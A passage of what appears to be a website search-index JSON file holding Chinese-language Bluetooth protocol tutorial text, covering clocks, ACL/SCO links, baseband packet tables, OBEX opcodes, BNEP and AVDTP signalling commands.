\uff0c\u65e0\u6548\u5730\u5740\u90e8\u5206\uff09\u3002","title":"3.1.\u84dd\u7259\u5730\u5740"},{"location":"other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E4%BC%A0%E8%BE%93%E5%B1%82%E5%8D%8F%E8%AE%AE/#32","text":"\u6bcf\u4e2a\u84dd\u7259\u8bbe\u5907\u90fd\u6709\u4e00\u4e2a\u72ec\u7acb\u8fd0\u884c\u7684\u5185\u90e8\u7cfb\u7edf\u65f6\u949f\uff0c\u79f0\u4e3a\u672c\u5730\u65f6\u949f\uff08Local Clock\uff09\uff0c\u51b3\u5b9a\u5b9a\u65f6\u5668\u7684\u6536\u53d1\u8df3\u9891\u3002\u4e3a\u4e86\u4e0e\u5176\u4ed6\u8bbe\u5907\u540c\u6b65\uff0c\u672c\u5730\u65f6\u949f\u8981\u52a0\u4e00\u4e2a\u504f\u79fb\u91cf\uff08offset\uff09\uff0c\u63d0\u4f9b\u7ed9\u5176\u4ed6\u8bbe\u5907\u540c\u6b65\u3002 \u5177\u4f53\u8bf4\u6765\uff0c\u84dd\u7259\u7cfb\u7edf\u4e2d\u7684\u65f6\u949f\u5206\u4e3a\u4ee5\u4e0b\u51e0\u79cd\uff1a CLKN\uff1a \u672c\u5730\u65f6\u949f\uff1a CLKE\uff1a \u9884\u8ba1\u65f6\u949f\uff0c\u626b\u63cf\u5bfb\u547c\u8fc7\u7a0b\u4e2d\u7528\u5230\uff1b CLK\uff1a \u8bbe\u5907\u5b9e\u9645\u8fd0\u884c\u7684\u65f6\u949f\u3002 \u8fd9\u4e09\u8005\u4e4b\u95f4\u5b58\u5728\u7740\u76f8\u5173\u5173\u7cfb\uff0c\u5177\u4f53\u8bf4\u6765 CLKE \u3001 CLK \u7531 CLKN \u52a0\u4e0a\u4e00\u4e2a\u504f\u79fb\u91cf\u5f97\u5230\u7684\u3002 \u4e3b\u8bbe\u5907 \uff1a CLK = CLKN \u4ece\u8bbe\u5907 \uff1a CLK = CLKN + offset","title":"3.2.\u84dd\u7259\u65f6\u949f"},{"location":"other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E4%BC%A0%E8%BE%93%E5%B1%82%E5%8D%8F%E8%AE%AE/#33","text":"\u901a\u4fe1\u8bbe\u5907\u95f4\u7269\u7406\u5c42\u7684\u6570\u636e\u8fde\u63a5\u901a\u9053\u5c31\u662f\u7269\u7406\u94fe\u8def\u3002 ACL \uff08A synchronous Connectionless \uff09\u5f02\u6b65\u65e0\u8fde\u63a5\u94fe\u8def\uff1b\u5bf9\u65f6\u95f4\u8981\u6c42\u4e0d\u654f\u611f\u7684\u6570\u636e\u901a\u4fe1\uff0c\u5982\u6587\u4ef6\u6570\u636e\u3001\u63a7\u5236\u4fe1\u4ee4\u7b49\u3002 SCO \uff08 Synochronous Connection Oriented \uff09\u540c\u6b65\u9762\u5411\u8fde\u63a5\u94fe\u8def\uff1b\u5bf9\u65f6\u95f4\u6bd4\u8f83\u654f\u611f\u7684\u901a\u4fe1\uff0c\u5982\uff1a\u8bed\u97f3\uff1b\u6700\u591a\u53ea\u652f\u63013\u6761 SCO \u94fe\u8def\uff0c\u4e0d\u652f\u6301\u91cd\u4f20\u3002","title":"3.3.\u84dd\u7259\u7269\u7406\u94fe\u8def"},{"location":"other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E4%BC%A0%E8%BE%93%E5%B1%82%E5%8D%8F%E8%AE%AE/#34","text":"\u57fa\u5e26\u5206\u7ec4\u81f3\u5c11\u5305\u62ec\uff1a\u63a5\u5165\u7801\u3001\u5206\u7ec4\u5934\u3001\u6709\u6548\u8f7d\u8377\uff1b \u63a5\u5165\u7801 \u7528\u4e8e\u540c\u6b65\u3001\u76f4\u6d41\u3001\u8f7d\u9891\u6cc4\u6f0f\u504f\u7f6e\u8865\u507f\u6807\u8bc6\uff1b \u5206\u7ec4\u5934 \u5305\u542b\u94fe\u8def\u4fe1\u606f\uff0c\u786e\u4fdd\u7ea0\u6b63\u8f83\u591a\u7684\u9519\u8bef\u3002 \u8be6\u7ec6\u5206\u7ec4\u7c7b\u578b\u5982\u4e0b\uff1a \u5206\u7ec4\u7c7b\u522b Type (b3b2b1b0) \u65f6\u9699 SCO ACL \u94fe\u8def\u63a7\u5236\u5206\u7ec4 0000 1 NULL NULL 0001 POLL POLL 0010 FHS FHS 0011 DM1 DM1 \u5355\u65f6\u9699\u5206\u7ec4 0100 1 \u672a\u5b9a\u4e49 NULL 0101 HV1 0110 HV2 0111 HV3 1000 DV 1001 NULL AUX1 \u4e09\u65f6\u9699\u5206\u7ec4 1010 3 \u672a\u5b9a\u4e49 DM3 1011 1100 \u672a\u5b9a\u4e49 1101 \u4e94\u65f6\u9699\u5206\u7ec4 1110 5 \u672a\u5b9a\u4e49 DM5 1111 ACL\u5206\u7ec4\u5f62\u5f0f\u4e3a\uff1aD(M|H)\uff081|3|5\uff09,D \u4ee3\u8868\u6570\u636e\u5206\u7ec4\uff0c M \u4ee3\u8868\u7528 2/3 \u6bd4\u4f8b\u7684 FEC \u7684\u4e2d\u7b49\u901f\u7387\u5206\u7ec4\uff1b H \u4ee3\u8868\u4e0d\u4f7f\u7528\u7ea0\u9519\u7801\u7684\u9ad8\u901f\u7387\u5206\u7ec4\uff1b 1\u30013\u30015 \u5206\u522b\u4ee3\u8868\u5206\u7ec4\u6240\u5360\u7528\u7684\u65f6\u9699\u6570\u76ee\uff1b \u200bDM1\u3001DM3\u3001DM5\u3001DH1\u3001DH3\u3001DH5 * SCO\u5206\u7ec4\u5f62\u5f0f\u4e3a\uff1aHV(1|2|3)\u3002HV \u4ee3\u8868\u9ad8\u8d28\u91cf\u8bed\u8a00\u5206\u7ec4\uff0c 1\u30012\u30013 \u6709\u6548\u8f7d\u8377\u6240\u91c7\u7528\u7684\u7ea0\u9519\u7801\u65b9\u6cd5\u3002 1 \u4e3a 1/3 \u6bd4\u4f8b FEC \uff0c\u8bbe\u5907 2 \u4e2a\u65f6\u9699\u53d1\u9001\u4e00\u4e2a\u5355\u65f6\u9699\u5206\u7ec4\uff1b 2 \u4e3a 2/3 \u6bd4\u4f8b FEC \uff0c\u8bbe\u5907 4 \u4e2a\u65f6\u9699\u53d1\u9001\u4e00\u4e2a\u5355\u65f6\u9699\u5206\u7ec4\uff1b 3 \u4e3a\u4e0d\u4f7f\u7528\u7ea0\u9519\u7801\uff0c\u8bbe\u5907 6 \u4e2a\u65f6\u9699\u53d1\u9001\u4e00\u4e2a\u5355\u65f6\u9699\u5206\u7ec4\u3002 \u200bHV1\u3001HV2\u3001HV3","title":"3.4.\u84dd\u7259\u57fa\u5e26\u5206\u7ec4"},{"location":"other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E4%BC%A0%E8%BE%93%E5%B1%82%E5%8D%8F%E8%AE%AE/#341acl","text":"\u7c7b\u578b \u6709\u6548\u8f7d\u8377\u5934/\u5b57\u8282 \u7528\u6237\u6709\u6548\u8f7d\u8377/\u5b57\u8282 FEC CRC \u5bf9\u79f0\u6700\u5927\u901f\u7387/kbps \u975e\u5bf9\u79f0\u901f\u7387/kbps \u524d\u5411 \u540e\u5411 DM1 1 0\uff5e17 2/3 \u6709 108.8 108.8 108.8 DH1 1 0\uff5e27 \u65e0 \u6709 172.8 172.8 172.8 DM3 2 0\uff5e121 2/3 \u6709 258.1 387.2 54.4 DH3 2 0\uff5e183 \u65e0 \u6709 390.4 585.6 86.4 DM5 2 0\uff5e224 2/3 \u6709 286.7 477.8 36.3 MH5 2 0\uff5e339 \u65e0 \u6709 433.9 723.2 57.6 AUX1 1 0\uff5e29 \u65e0 \u65e0 185.6 185.6 185.6","title":"3.4.1.ACL\u5206\u7ec4"},{"location":"other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E4%BC%A0%E8%BE%93%E5%B1%82%E5%8D%8F%E8%AE%AE/#342sco","text":"\u7c7b\u578b \u6709\u6548\u8f7d\u8377\u5934/\u5b57\u8282 \u7528\u6237\u6709\u6548\u8f7d\u8377/\u5b57\u8282 FEC CRC \u6709\u6548\u8f7d\u8377\u957f\u5ea6 \u540c\u6b65\u901f\u7387/kbps \u5360\u7528Tsco\u6570\u76ee/\u8bed\u8a00\u957f\u5ea6 HV1 \u65e0 10 1/3 240\u4f4d 64 2/1.25ms HV2 20 2/3 4/2.5ms HV3 30 \u65e0 6/3.75ms 6/3.75ms 1D 10+(0-9)D 2/3D \u6709D 64+57.6D \u6ce8\u91ca\uff1a D \u8868\u793a\u53ea\u5bf9\u6570\u636e\u6bb5\u6709\u7528\uff0c DV \u8868\u793a\u5206\u7ec4\u5305\u542b\u6570\u636e\u6bb5\uff0c\u4e5f\u5305\u542b\u8bed\u8a00\u6bb5\u3002","title":"3.4.2.SCO\u5206\u7ec4"},{"location":"other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E4%BC%A0%E8%BE%93%E5%B1%82%E5%8D%8F%E8%AE%AE/#x","text":"\u84dd\u7259\u6838\u5fc3\u6280\u672f\u6982\u8ff0\uff08\u4e09\uff09\uff1a \u84dd\u7259\u534f\u8bae\u89c4\u8303\uff08\u5c04\u9891\u3001\u57fa\u5e26\u94fe\u8def\u63a7\u5236\u3001\u94fe\u8def\u7ba1\u7406\uff09 \u539f\u6587\u94fe\u63a5\uff1a https://jacksmiththu.github.io/2017/06/25/\u84dd\u7259\u534f\u8bae\u5165\u95e8\uff08\u4e8c\uff09\u4f20\u8f93\u5c42\u534f\u8bae/","title":"X.\u53c2\u8003\u94fe\u63a5"},{"location":"other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E5%9B%9B%EF%BC%89%E5%BA%94%E7%94%A8%E5%B1%82%E5%8D%8F%E8%AE%AE/","text":"\u84dd\u7259\u534f\u8bae\u5165\u95e8\uff08\u56db\uff09\u5e94\u7528\u5c42\u534f\u8bae 1.irOBEX \u7ea2\u5916\u5bf9\u8c61\u4ea4\u4e92\u534f\u8bae irOBEX \u7ea2\u5916\u5bf9\u8c61\u4ea4\u4e92\u534f\u8bae\uff0c\u7b80\u79f0 OBEX \uff0c\u4f7f\u9ad8\u5c42\u534f\u8bae\u540c\u65f6\u8fd0\u4f5c\u5728\u84dd\u7259\u548c\u7ea2\u5916\u7684\u65e0\u7ebf\u94fe\u8def\u4e4b\u4e0a\u3002\u4e3b\u8981\u64cd\u4f5c\u6307\u4ee4\u5305\u62ec\uff1a \u8fde\u63a5\u64cd\u4f5c \u65ad\u5f00\u64cd\u4f5c Put \u64cd\u4f5c Get \u64cd\u4f5c 1.1.\u8fde\u63a5\u64cd\u4f5c \u8fde\u63a5\u64cd\u4f5c\u7684\u64cd\u4f5c\u7801\u4e3a\uff1a 0x80\u3002 \u5b57\u82820 \u5b57\u82821\u30012 \u5b57\u82823 \u5b57\u82824 \u5b57\u82825\u30016 \u5b57\u82827\uff5en 0x80 \u8fde\u63a5\u8bf7\u6c42\u5206\u7ec4\u957f\u5ea6 OBEX\u7248\u672c\u53f7 \u6807\u5fd7 \u5ba2\u6237\u7aef\u53ef\u63a5\u6536\u6700\u5927\u7684OBEX\u5206\u7ec4\u957f\u5ea6 \u53ef\u9009\u5934 \u4e0b\u9762\u662f\u4e00\u4e2a\u8fde\u63a5\u64cd\u4f5c\u7684\u793a\u4f8b\uff1a \u5b57\u82820 \u5b57\u82821\u30012 \u5b57\u82823 \u5b57\u82824 \u5b57\u82825\u30016 \u5b57\u82827\uff5en 0x80 Connect\u547d\u4ee4 7 0x10 flags 65534 \u53ef\u9009\u5934 1.2.\u65ad\u5f00\u64cd\u4f5c \u65ad\u5f00\u64cd\u4f5c\u7684\u64cd\u4f5c\u7801\u4e3a\uff1a0x81\u3002 1.3.Put \u64cd\u4f5c Put \u64cd\u4f5c\u7684\u64cd\u4f5c\u7801\u4e3a\uff1a0x02\u3002 1.4.Get \u64cd\u4f5c Get \u64cd\u4f5c\u7684\u64cd\u4f5c\u7801\u4e3a\uff1a0x03\u3002 2.\u97f3\u9891\u4e0e\u7535\u8bdd\u63a7\u5236\u534f\u8bae 2.1.\u534f\u8bae\u67b6\u6784 \u84dd\u7259\u97f3\u9891\u5982\u4e0a\u56fe\u534f\u8bae\u6808\u6240\u793a\uff1a\u97f3\u9891\u901a\u8fc7\u57fa\u5e26\u4f20\u8f93\u540c\u6b65\u9762\u5411\u8fde\u63a5\u5206\u7ec4\u5b9e\u73b0\uff0c\u6ca1\u6709\u4ee5\u89c4\u8303\u7684\u5f62\u5f0f\u7ed9\u51fa\uff0c\u4e0d\u662f\u534f\u8bae\u6808\u7684\u4e00\u90e8\u5206\u3002 TCS_Binary \u662f\u4e00\u79cd\u57fa\u4e8e\u5206\u7ec4\u7535\u8bdd\u63a7\u5236\u4e8c\u8fdb\u5236\u7f16\u7801\u6307\u4ee4\u96c6\uff0c\u4f4d\u4e8e L2CAP \u4e4b\u4e0a\u3002\u5b9e\u73b0\u84dd\u7259\u65e0\u7ef3\u7535\u8bdd\u3001\u5bf9\u8bb2\u673a\u529f\u80fd\u3002 RFCOMM \u7528\u4e8e AT \u6307\u4ee4\uff0c\u62e8\u53f7\u4e0a\u7f51\u3001\u84dd\u7259\u8033\u673a\u3001\u8033\u9ea6\u3001\u4f20\u771f\u901a\u8fc7 AT \u53d1\u9001\u6307\u4ee4\u63a7\u5236\u3002 2.2.\u97f3\u9891\u90e8\u5206 64kbps \u7535\u4fe1\u7ea7\u8bed\u8a00\u8d28\u91cf\u97f3\u9891\u6d41 \u200b CVSD continuous variable slope delta \u8fde\u7eed\u53ef\u53d8\u659c\u7387\u589e\u91cf\u3002 \u200b PCM pulse code modulation \u3002 \u200b PCM \u5b58\u5728\u659c\u7387\u6548\u5e94\u3002 CVSD \u4f7f\u7528\u97f3\u8282\u538b\u7f29\u7b97\u6cd5\uff0c\u7f16\u7801\u6b65\u957f\u6839\u636e\u4fe1\u53f7\u659c\u7387\u53d8\u5316\u81ea\u52a8\u8c03\u6574\uff0c\u662f\u73b0\u5728\u6bd4\u8f83\u597d\u7684\u7f16\u7801\u65b9\u6848\uff0c\u63d0\u9ad8\u8bed\u8a00\u7684\u6297\u5e72\u6270\u80fd\u529b\u3002 2.3.\u7535\u8bdd\u63a7\u5236\u90e8\u5206 TCS-Binary \u7535\u8bdd\u63a7\u5236\u90e8\u5206\u3002 \u7535\u8bdd\u547c\u53eb \u200b\u547c\u53eb\u63a7\u5236\u3001\u547c\u53eb\u5efa\u7acb\u3001\u547c\u53eb\u62c6\u9664\uff1b * \u7ec4\u7ba1\u7406 \u200b\u8bbf\u95ee\u6743\u9650\u8bf7\u6c42\u3001\u5206\u5e03\u5f0f\u914d\u7f6e\u3001\u5feb\u901f\u5185\u90e8\u6210\u5458\u8bbf\u95ee\u3002 3.\u7f51\u7edc\u5c01\u88c5\u534f\u8bae BNEP BNEP \uff08 Bluetooth Network Encapsulation Protocol \uff09 \u7f51\u7edc\u5c01\u88c5\u534f\u8bae\u3002\u4e3a\u4e86\u4f7f\u96c6\u6210\u84dd\u7259\u6280\u672f\u7684\u7535\u8111\u3001\u7535\u8bdd\u3001 PDA \u3001\u5bb6\u7528\u7535\u5668\u7b49\u7f51\u7edc\u8bbe\u5907\u4ea4\u6362\u4fe1\u606f\uff0c\u9700\u8981\u5728\u7f51\u7edc\u5c42\u7edf\u4e00\u6570\u636e\u5206\u7ec4\u3002\u7f51\u7edc\u5c01\u88c5\u534f\u8bae\u5c06\u6765\u81ea\u4e0d\u540c\u7f51\u7edc\u7684\u6570\u636e\u5206\u7ec4\u91cd\u65b0\u5c01\u88c5\uff0c\u901a\u8fc7 L2CAP \u8fdb\u884c\u4f20\u8f93\u3002 BNEP \u652f\u6301 Ipv4\u3001Ipv6\u3001IPX \u3002 4.\u97f3\u89c6\u9891\u5206\u53d1\u534f\u8baeAVDTP AVDTP \uff08Audio/Video Distribution Transport Protocol\uff09 \u97f3\u89c6\u9891\u5206\u53d1\u4f20\u8f93\u534f\u8bae\u3002 AVDTP \u4fe1\u4ee4\u5217\u8868: \u547d\u4ee4 \u4fe1\u4ee4\u6807\u8bc6\u7b26 \u63cf\u8ff0 AVDTP_DISCOVER 0x01 \u53d1\u73b0\u8bbe\u5907\u4e2d\u7684\u6d41\u7aef\u70b9 AVDTP_GET_CAPABILITIES 0x02 \u83b7\u5f97\u6d41\u7aef\u70b9\u7684\u4fe1\u606f\u80fd\u529b AVDTP_SET_CONFIGURATION 0x03 \u5bf9SEP\u8fdb\u884c\u914d\u7f6e AVDTP_GET_CONFIGURATION 0x04 \u83b7\u53d6SEP\u5f53\u524d\u914d\u7f6e AVDTP_RECONFIGURE 0x05 \u5bf9SEP\u91cd\u65b0\u914d\u7f6e AVDTP_OPEN 0x06 \u6210\u529f\u7684\u914d\u7f6eSEP\u540e\uff0c\u6253\u5f00\u6d41 AVDTP_START 0x07 \u6d41\u88ab\u6253\u5f00\uff1a\u7528\u4e8e\u5f00\u59cb\u5f62\u6210\u6d41\uff1b\u6d41\u6682\u505c\u65f6\uff1a\u7528\u4e8e\u91cd\u65b0\u5f62\u6210\u6d41\u3002 AVDTP_CLOSE 0x08 \u5bf9SEP\u5173\u95ed AVDTP_SUSPEND 0x09 \u8bf7\u6c42SEP\u6682\u505c AVDTP_SECURITY_CONTROL 0x0A \u8bbe\u7f6e\u8bbe\u5907\u5185\u5bb9\u4fdd\u62a4\u3001\u6216\u8005\u8bf7\u6c42\u8bbe\u5907\u72b6\u51b5\u4fe1\u606f AVDTP_ABORT 0x0B \u4e2d\u65ad\u6b63\u5728\u5efa\u7acb\u6216\u8005\u4f20\u8f93\u7684\u8fc7\u7a0b AVDTP_GET_ALL_CAPABILITIES AVDTP_DELAYREPORT 5. \u97f3\u89c6\u9891\u63a7\u5236\u4f20\u8f93\u534f\u8baeAVCTP AVCTP \u53ef\u4ee5\u4f7f\u97f3\u89c6\u9891\u8bbe\u5907\u540c\u65f6\u652f\u6301\u591a\u4e2a\u5e94\u7528\u6846\u67b6\uff0c\u6bcf\u4e2a\u5e94\u7528\u6846\u67b6\u5b9a\u4e49\u4e86\u5404\u81ea\u76f8\u5e94\u7684\u6d88\u606f\u683c\u5f0f\u4e0e\u5e94\u7528\u89c4\u5219\u3002 6.\u53c2\u8003\u94fe\u63a5 \u84dd\u7259\u6838\u5fc3\u6280\u672f\u6982\u8ff0\uff08\u4e94\uff09\uff1a\u84dd\u7259\u534f\u8bae\u89c4\u8303\uff08irOBEX\u3001BNEP\u3001AVDTP\u3001AVCTP\uff09 \u539f\u6587\u94fe\u63a5\uff1a https://jacksmiththu.github.io/2017/08/08/\u84dd\u7259\u534f\u8bae\u5165\u95e8\uff08\u56db\uff09\u5e94\u7528\u5c42\u534f\u8bae/","title":"\u84dd\u7259\u534f\u8bae\u5165\u95e8\uff08\u56db\uff09\u5e94\u7528\u5c42\u534f\u8bae"},{"location":"other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E5%9B%9B%EF%BC%89%E5%BA%94%E7%94%A8%E5%B1%82%E5%8D%8F%E8%AE%AE/#_1","text":"","title":"\u84dd\u7259\u534f\u8bae\u5165\u95e8\uff08\u56db\uff09\u5e94\u7528\u5c42\u534f\u8bae"},{"location":"other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E5%9B%9B%EF%BC%89%E5%BA%94%E7%94%A8%E5%B1%82%E5%8D%8F%E8%AE%AE/#1irobex","text":"irOBEX \u7ea2\u5916\u5bf9\u8c61\u4ea4\u4e92\u534f\u8bae\uff0c\u7b80\u79f0 OBEX \uff0c\u4f7f\u9ad8\u5c42\u534f\u8bae\u540c\u65f6\u8fd0\u4f5c\u5728\u84dd\u7259\u548c\u7ea2\u5916\u7684\u65e0\u7ebf\u94fe\u8def\u4e4b\u4e0a\u3002\u4e3b\u8981\u64cd\u4f5c\u6307\u4ee4\u5305\u62ec\uff1a \u8fde\u63a5\u64cd\u4f5c \u65ad\u5f00\u64cd\u4f5c Put \u64cd\u4f5c Get \u64cd\u4f5c","title":"1.irOBEX \u7ea2\u5916\u5bf9\u8c61\u4ea4\u4e92\u534f\u8bae"},{"location":"other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E5%9B%9B%EF%BC%89%E5%BA%94%E7%94%A8%E5%B1%82%E5%8D%8F%E8%AE%AE/#11","text":"\u8fde\u63a5\u64cd\u4f5c\u7684\u64cd\u4f5c\u7801\u4e3a\uff1a 0x80\u3002 \u5b57\u82820 \u5b57\u82821\u30012 \u5b57\u82823 \u5b57\u82824 \u5b57\u82825\u30016 \u5b57\u82827\uff5en 0x80 \u8fde\u63a5\u8bf7\u6c42\u5206\u7ec4\u957f\u5ea6 OBEX\u7248\u672c\u53f7 \u6807\u5fd7 \u5ba2\u6237\u7aef\u53ef\u63a5\u6536\u6700\u5927\u7684OBEX\u5206\u7ec4\u957f\u5ea6 \u53ef\u9009\u5934 \u4e0b\u9762\u662f\u4e00\u4e2a\u8fde\u63a5\u64cd\u4f5c\u7684\u793a\u4f8b\uff1a \u5b57\u82820 \u5b57\u82821\u30012 \u5b57\u82823 \u5b57\u82824 \u5b57\u82825\u30016 \u5b57\u82827\uff5en 0x80 Connect\u547d\u4ee4 7 0x10 flags 65534 \u53ef\u9009\u5934","title":"1.1.\u8fde\u63a5\u64cd\u4f5c"},{"location":"other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E5%9B%9B%EF%BC%89%E5%BA%94%E7%94%A8%E5%B1%82%E5%8D%8F%E8%AE%AE/#12","text":"\u65ad\u5f00\u64cd\u4f5c\u7684\u64cd\u4f5c\u7801\u4e3a\uff1a0x81\u3002","title":"1.2.\u65ad\u5f00\u64cd\u4f5c"},{"location":"other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E5%9B%9B%EF%BC%89%E5%BA%94%E7%94%A8%E5%B1%82%E5%8D%8F%E8%AE%AE/#13put","text":"Put \u64cd\u4f5c\u7684\u64cd\u4f5c\u7801\u4e3a\uff1a0x02\u3002","title":"1.3.Put \u64cd\u4f5c"},{"location":"other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E5%9B%9B%EF%BC%89%E5%BA%94%E7%94%A8%E5%B1%82%E5%8D%8F%E8%AE%AE/#14get","text":"Get \u64cd\u4f5c\u7684\u64cd\u4f5c\u7801\u4e3a\uff1a0x03\u3002","title":"1.4.Get \u64cd\u4f5c"},{"location":"other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E5%9B%9B%EF%BC%89%E5%BA%94%E7%94%A8%E5%B1%82%E5%8D%8F%E8%AE%AE/#2","text":"","title":"2.\u97f3\u9891\u4e0e\u7535\u8bdd\u63a7\u5236\u534f\u8bae"},{"location":"other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E5%9B%9B%EF%BC%89%E5%BA%94%E7%94%A8%E5%B1%82%E5%8D%8F%E8%AE%AE/#21","text":"\u84dd\u7259\u97f3\u9891\u5982\u4e0a\u56fe\u534f\u8bae\u6808\u6240\u793a\uff1a\u97f3\u9891\u901a\u8fc7\u57fa\u5e26\u4f20\u8f93\u540c\u6b65\u9762\u5411\u8fde\u63a5\u5206\u7ec4\u5b9e\u73b0\uff0c\u6ca1\u6709\u4ee5\u89c4\u8303\u7684\u5f62\u5f0f\u7ed9\u51fa\uff0c\u4e0d\u662f\u534f\u8bae\u6808\u7684\u4e00\u90e8\u5206\u3002 TCS_Binary \u662f\u4e00\u79cd\u57fa\u4e8e\u5206\u7ec4\u7535\u8bdd\u63a7\u5236\u4e8c\u8fdb\u5236\u7f16\u7801\u6307\u4ee4\u96c6\uff0c\u4f4d\u4e8e L2CAP \u4e4b\u4e0a\u3002\u5b9e\u73b0\u84dd\u7259\u65e0\u7ef3\u7535\u8bdd\u3001\u5bf9\u8bb2\u673a\u529f\u80fd\u3002 RFCOMM \u7528\u4e8e AT \u6307\u4ee4\uff0c\u62e8\u53f7\u4e0a\u7f51\u3001\u84dd\u7259\u8033\u673a\u3001\u8033\u9ea6\u3001\u4f20\u771f\u901a\u8fc7 AT \u53d1\u9001\u6307\u4ee4\u63a7\u5236\u3002","title":"2.1.\u534f\u8bae\u67b6\u6784"},{"location":"other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E5%9B%9B%EF%BC%89%E5%BA%94%E7%94%A8%E5%B1%82%E5%8D%8F%E8%AE%AE/#22","text":"64kbps \u7535\u4fe1\u7ea7\u8bed\u8a00\u8d28\u91cf\u97f3\u9891\u6d41 \u200b CVSD continuous variable slope delta \u8fde\u7eed\u53ef\u53d8\u659c\u7387\u589e\u91cf\u3002 \u200b PCM pulse code modulation \u3002 \u200b PCM \u5b58\u5728\u659c\u7387\u6548\u5e94\u3002 CVSD \u4f7f\u7528\u97f3\u8282\u538b\u7f29\u7b97\u6cd5\uff0c\u7f16\u7801\u6b65\u957f\u6839\u636e\u4fe1\u53f7\u659c\u7387\u53d8\u5316\u81ea\u52a8\u8c03\u6574\uff0c\u662f\u73b0\u5728\u6bd4\u8f83\u597d\u7684\u7f16\u7801\u65b9\u6848\uff0c\u63d0\u9ad8\u8bed\u8a00\u7684\u6297\u5e72\u6270\u80fd\u529b\u3002","title":"2.2.\u97f3\u9891\u90e8\u5206"},{"location":"other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E5%9B%9B%EF%BC%89%E5%BA%94%E7%94%A8%E5%B1%82%E5%8D%8F%E8%AE%AE/#23","text":"TCS-Binary \u7535\u8bdd\u63a7\u5236\u90e8\u5206\u3002 \u7535\u8bdd\u547c\u53eb \u200b\u547c\u53eb\u63a7\u5236\u3001\u547c\u53eb\u5efa\u7acb\u3001\u547c\u53eb\u62c6\u9664\uff1b * \u7ec4\u7ba1\u7406 \u200b\u8bbf\u95ee\u6743\u9650\u8bf7\u6c42\u3001\u5206\u5e03\u5f0f\u914d\u7f6e\u3001\u5feb\u901f\u5185\u90e8\u6210\u5458\u8bbf\u95ee\u3002","title":"2.3.\u7535\u8bdd\u63a7\u5236\u90e8\u5206"},{"location":"other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E5%9B%9B%EF%BC%89%E5%BA%94%E7%94%A8%E5%B1%82%E5%8D%8F%E8%AE%AE/#3-bnep","text":"BNEP \uff08 Bluetooth Network Encapsulation Protocol \uff09 \u7f51\u7edc\u5c01\u88c5\u534f\u8bae\u3002\u4e3a\u4e86\u4f7f\u96c6\u6210\u84dd\u7259\u6280\u672f\u7684\u7535\u8111\u3001\u7535\u8bdd\u3001 PDA \u3001\u5bb6\u7528\u7535\u5668\u7b49\u7f51\u7edc\u8bbe\u5907\u4ea4\u6362\u4fe1\u606f\uff0c\u9700\u8981\u5728\u7f51\u7edc\u5c42\u7edf\u4e00\u6570\u636e\u5206\u7ec4\u3002\u7f51\u7edc\u5c01\u88c5\u534f\u8bae\u5c06\u6765\u81ea\u4e0d\u540c\u7f51\u7edc\u7684\u6570\u636e\u5206\u7ec4\u91cd\u65b0\u5c01\u88c5\uff0c\u901a\u8fc7 L2CAP \u8fdb\u884c\u4f20\u8f93\u3002 BNEP \u652f\u6301 Ipv4\u3001Ipv6\u3001IPX \u3002","title":"3.\u7f51\u7edc\u5c01\u88c5\u534f\u8bae BNEP"},{"location":"other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E5%9B%9B%EF%BC%89%E5%BA%94%E7%94%A8%E5%B1%82%E5%8D%8F%E8%AE%AE/#4avdtp","text":"AVDTP \uff08Audio/Video Distribution Transport Protocol\uff09 \u97f3\u89c6\u9891\u5206\u53d1\u4f20\u8f93\u534f\u8bae\u3002 AVDTP \u4fe1\u4ee4\u5217\u8868: \u547d\u4ee4 \u4fe1\u4ee4\u6807\u8bc6\u7b26 \u63cf\u8ff0 AVDTP_DISCOVER 0x01 \u53d1\u73b0\u8bbe\u5907\u4e2d\u7684\u6d41\u7aef\u70b9 AVDTP_GET_CAPABILITIES 0x02 \u83b7\u5f97\u6d41\u7aef\u70b9\u7684\u4fe1\u606f\u80fd\u529b AVDTP_SET_CONFIGURATION 0x03 \u5bf9SEP\u8fdb\u884c\u914d\u7f6e AVDTP_GET_CONFIGURATION 0x04 \u83b7\u53d6SEP\u5f53\u524d\u914d\u7f6e AVDTP_RECONFIGURE 0x05 \u5bf9SEP\u91cd\u65b0\u914d\u7f6e AVDTP_OPEN 0x06 \u6210\u529f\u7684\u914d\u7f6eSEP\u540e\uff0c\u6253\u5f00\u6d41 AVDTP_START 0x07 